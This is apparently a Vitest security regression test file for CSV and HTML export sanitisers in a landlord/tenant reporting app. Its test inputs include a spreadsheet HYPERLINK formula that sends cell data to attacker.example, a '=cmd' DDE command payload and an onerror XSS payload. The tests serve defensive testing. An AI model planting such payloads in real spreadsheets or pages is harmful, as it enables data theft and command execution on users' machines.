import { describe, expect, it } from "vitest";

import { csvCell, escapeHtml, toCsv } from "./exportSafety";

/**
 * These are security regression tests, not formatting tests.
 *
 * Report exports are built from API data — tenant names, unit labels, expense
 * descriptions — all of which is typed in at data entry from documents a tenant
 * supplied. The export then lands in a spreadsheet on the landlord's machine,
 * or in a print window that inherits the app's own origin. Both will execute
 * what they are given.
 */
describe("csvCell — spreadsheet formula injection", () => {
  it.each([
    ['=HYPERLINK("https://attacker.example/?d="&A1,"Receipt")', "="],
    ["+1+1", "+"],
    ["-2+3", "-"],
    ["@SUM(A1:A9)", "@"],
    ["\t=1+1", "\t"],
    ["\r=1+1", "\r"],
  ])("neutralises a cell starting with %s", (payload) => {
    const cell = csvCell(payload);
    // The apostrophe goes INSIDE the CSV quotes, which is what makes a
    // spreadsheet treat the value as text rather than a formula.
    expect(cell.startsWith("\"'")).toBe(true);
    // Round-tripping back through the CSV escape must give the original value
    // with only the leading apostrophe added — nothing else is altered.
    const decoded = cell.slice(1, -1).replace(/""/g, '"');
    expect(decoded).toBe(`'${payload}`);
  });

  it("leaves ordinary text alone", () => {
    expect(csvCell("Mercy Murunga")).toBe('"Mercy Murunga"');
    expect(csvCell("DON1A")).toBe('"DON1A"');
  });

  it("does not prefix numbers — that would break every SUM in the sheet", () => {
    expect(csvCell(12000)).toBe('"12000"');
    expect(csvCell(-500)).toBe('"-500"');
  });

  it("escapes an embedded quote instead of breaking the row", () => {
    // The previous implementation was `"${cell}"`, so a value containing a
    // quote split one row into several and silently corrupted the export.
    expect(csvCell('Jane "JJ" Doe')).toBe('"Jane ""JJ"" Doe"');
  });

  it("renders null/undefined as an empty cell, not the string 'null'", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
  });
});

describe("toCsv", () => {
  it("keeps a row intact when a cell contains a comma, a quote and a newline", () => {
    const csv = toCsv(
      ["Tenant", "Notes"],
      [["Mercy, M", 'said "ok"\nthen left']],
    );
    const [header] = csv.split("\r\n");
    expect(header).toBe('"Tenant","Notes"');
    // The embedded newline stays inside the quoted field.
    expect(csv).toContain('"said ""ok""\nthen left"');
  });

  it("neutralises a malicious tenant name coming through a whole export", () => {
    const csv = toCsv(["Tenant"], [["=cmd|'/c calc'!A0"]]);
    expect(csv).toContain("\"'=cmd");
  });
});

describe("escapeHtml — print-window XSS", () => {
  it("defuses a script payload in a tenant name", () => {
    expect(escapeHtml('<img src=x onerror="alert(1)">')).toBe(
      "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;",
    );
  });

  it("escapes the characters that break out of an attribute", () => {
    expect(escapeHtml(`"'`)).toBe("&quot;&#39;");
  });

  it("escapes ampersands first so entities are not double-decoded", () => {
    expect(escapeHtml("&lt;")).toBe("&amp;lt;");
  });

  it("passes ordinary text and numbers through", () => {
    expect(escapeHtml("Wilkem Edge — Donholm")).toBe("Wilkem Edge — Donholm");
    expect(escapeHtml(12000)).toBe("12000");
    expect(escapeHtml(null)).toBe("");
  });
});
